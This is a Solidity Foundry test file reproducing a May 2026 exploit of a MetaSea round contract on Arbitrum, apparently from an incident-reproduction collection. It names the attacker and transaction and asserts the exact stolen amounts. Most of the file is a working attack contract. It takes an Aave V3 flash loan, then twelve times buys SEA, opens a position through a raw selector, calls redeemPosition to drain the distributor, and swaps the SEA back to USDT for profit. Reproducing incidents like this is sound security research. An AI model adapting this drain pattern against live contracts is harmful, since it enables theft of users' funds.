// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$110K
// Attacker : https://arbiscan.io/address/0x352173fabf0e67e1cb1fcdf15474d0477d5d3674
// Attack Contract : https://arbiscan.io/address/0x32db518e84955739912b6257cc65e3e8374b60e4
// Vulnerable Contract : https://arbiscan.io/address/0xa70f31c06f921019237fc00b1417217dae5c37c5
// Attack Tx : https://arbiscan.io/tx/0x001cb16e17c4c5a5c4d02423c9e9b2f2b11ab6b2a1baf2ba53b8fcaf06167716
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xa70f31c06f921019237fc00b1417217dae5c37c5#code
//
// @Analysis
// Post-mortem : N/A
// Hacking God : https://anomly.rs/metasea-redeemposition-distributor-drain-arb-2026-05-17

contract SEATokenTest is Test {
    bytes32 internal constant TX_HASH = 0x001cb16e17c4c5a5c4d02423c9e9b2f2b11ab6b2a1baf2ba53b8fcaf06167716;
    address internal constant ATTACKER = 0x352173FAbF0E67E1cB1fcdF15474D0477D5D3674;
    address internal constant AAVE_V3_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant ROUND = 0xA70F31c06F921019237Fc00B1417217Dae5c37C5;
    address internal constant DISTRIBUTOR = 0x5210525fbf63E55ecA1Ade9Ff98A3Ef80AF9220e;
    address internal constant SEA_USDT_PAIR = 0xEeb9c6B73a9Ba397FBEA320d9E4cCe7B8AC10513;
    uint256 internal constant ACTUAL_USDT_PROFIT = 13_904_941_068;
    uint256 internal constant ACTUAL_SEA_DRAINED = 245_547_600_901_738;
    IERC20 internal constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 internal constant SEA = IERC20(0xE548CF28fbB95cEDC2b5c25a24f9AA8D06dcc0A6);

    SEATokenExploit internal exploit;

    function setUp() public {
        vm.createSelectFork("arbitrum", TX_HASH);
        exploit = new SEATokenExploit(ATTACKER);
        vm.label(ATTACKER, "Attacker");
        vm.label(AAVE_V3_POOL, "Aave V3 Pool");
        vm.label(ROUND, "MetaSea Round");
        vm.label(DISTRIBUTOR, "SEA Distributor");
        vm.label(SEA_USDT_PAIR, "SEA/USDT Pair");
        vm.label(address(USDT), "USDT");
        vm.label(address(SEA), "SEA");
        vm.label(address(exploit), "Exploit Contract");
    }

    function testExploit() public {
        uint256 beforeUsdt = USDT.balanceOf(ATTACKER);
        uint256 beforeDistributorSea = SEA.balanceOf(DISTRIBUTOR);

        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 usdtProfit = USDT.balanceOf(ATTACKER) - beforeUsdt;
        uint256 distributorSeaDrained = beforeDistributorSea - SEA.balanceOf(DISTRIBUTOR);

        assertEq(usdtProfit, ACTUAL_USDT_PROFIT, "USDT profit");
        assertEq(distributorSeaDrained, ACTUAL_SEA_DRAINED, "SEA drain");

        console.log("Stolen SEA", distributorSeaDrained);
        console.log("Profit USDT", usdtProfit);
    }
}

contract SEATokenExploit {
    IAaveV3Pool internal constant AAVE_V3_POOL = IAaveV3Pool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IMetaSeaRound internal constant ROUND = IMetaSeaRound(0xA70F31c06F921019237Fc00B1417217Dae5c37C5);
    IUniswapV2Pair internal constant SEA_USDT_PAIR = IUniswapV2Pair(0xEeb9c6B73a9Ba397FBEA320d9E4cCe7B8AC10513);
    IERC20 internal constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 internal constant SEA = IERC20(0xE548CF28fbB95cEDC2b5c25a24f9AA8D06dcc0A6);

    bytes4 internal constant OPEN_POSITION_SELECTOR = 0x987217bc;
    uint256 internal constant FLASH_LOAN_AMOUNT = 3_300e6;
    uint256 internal constant SEA_BUY_AMOUNT = 300e6;
    uint256 internal constant OPEN_AMOUNT = 3_000e6;
    uint256 internal constant LOOP_COUNT = 12;

    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        AAVE_V3_POOL.flashLoanSimple(address(this), address(USDT), FLASH_LOAN_AMOUNT, "", 0);

        uint256 profit = USDT.balanceOf(address(this));
        require(USDT.transfer(owner, profit), "profit transfer failed");
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == address(AAVE_V3_POOL), "not aave");
        require(initiator == address(this), "bad initiator");
        require(asset == address(USDT), "bad asset");

        for (uint256 i; i < LOOP_COUNT; ++i) {
            _openAndRedeem();
        }

        require(USDT.approve(address(AAVE_V3_POOL), amount + premium), "repay approve failed");
        return true;
    }

    function _openAndRedeem() internal {
        _swapUsdtForSea(SEA_BUY_AMOUNT);

        require(USDT.approve(address(ROUND), OPEN_AMOUNT), "USDT approve failed");
        (bool opened,) = address(ROUND).call(abi.encodeWithSelector(OPEN_POSITION_SELECTOR, OPEN_AMOUNT, uint256(0)));
        require(opened, "open failed");

        require(SEA.approve(address(ROUND), type(uint256).max), "SEA approve failed");
        ROUND.redeemPosition();

        uint256 seaBalance = SEA.balanceOf(address(this));
        if (seaBalance > 0) {
            _swapSeaForUsdt(seaBalance);
        }
    }

    function _swapUsdtForSea(uint256 usdtIn) internal {
        (uint112 reserveSea, uint112 reserveUsdt,) = SEA_USDT_PAIR.getReserves();
        uint256 seaOut = (usdtIn * reserveSea) / (uint256(reserveUsdt) + usdtIn);

        require(USDT.transfer(address(SEA_USDT_PAIR), usdtIn), "USDT pair transfer failed");
        SEA_USDT_PAIR.swap((seaOut * 97) / 100, 0, address(this), "");
    }

    function _swapSeaForUsdt(uint256 seaIn) internal {
        (uint112 reserveSea, uint112 reserveUsdt,) = SEA_USDT_PAIR.getReserves();
        uint256 pairSeaBefore = SEA.balanceOf(address(SEA_USDT_PAIR));

        require(SEA.transfer(address(SEA_USDT_PAIR), seaIn), "SEA pair transfer failed");

        uint256 seaReceived = SEA.balanceOf(address(SEA_USDT_PAIR)) - pairSeaBefore;
        uint256 amountInWithFee = seaReceived * 970;
        uint256 usdtOut = (amountInWithFee * reserveUsdt) / (uint256(reserveSea) * 1000 + amountInWithFee);

        SEA_USDT_PAIR.swap(0, usdtOut, address(this), "");
    }
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMetaSeaRound {
    function redeemPosition() external;
}
